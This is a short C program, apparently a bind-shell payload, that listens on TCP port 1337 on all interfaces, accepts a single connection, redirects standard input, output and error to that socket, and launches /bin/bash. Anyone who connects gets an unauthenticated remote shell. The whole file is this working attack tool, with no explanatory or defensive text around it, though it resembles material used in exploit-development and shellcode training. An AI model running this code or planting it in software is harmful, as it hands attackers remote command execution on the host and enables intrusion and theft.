#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(void) {
    struct sockaddr_in server_addr;
    int socket_fd;
    int accept_fd;
    int retval;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(1337);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    /* Create a new TCP socket */
    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd < 0) {
        fprintf(stderr, "Socket creation failed.\n");
        return -1;
    }

    /* Bind the address to a socket */
    retval = bind(socket_fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
    if (retval != 0) {
        fprintf(stderr, "Socket binding failed.\n");
        return -1;
    }

    /* Start listening for new connections */
    retval = listen(socket_fd, 0);
    if (retval != 0) {
        fprintf(stderr, "Socket listening failed.\n");
        return -1;
    }

    /* Accept new connections */
    accept_fd = accept(socket_fd, 0, 0);
    if (accept_fd == -1) {
        fprintf(stderr, "Accepting incoming connections failed.\n");
        return -1;
    }

    /* Duplicates accept's socket file descriptor into stdin, stdout, stderr */
    for (int fd = 0; fd < 3; fd++) {
        dup2(accept_fd, fd);
    }

    execve("/bin/bash", NULL, NULL);

    /* Close sockets */
    shutdown(accept_fd, 2);
    shutdown(socket_fd, 2);

    return 0;
}
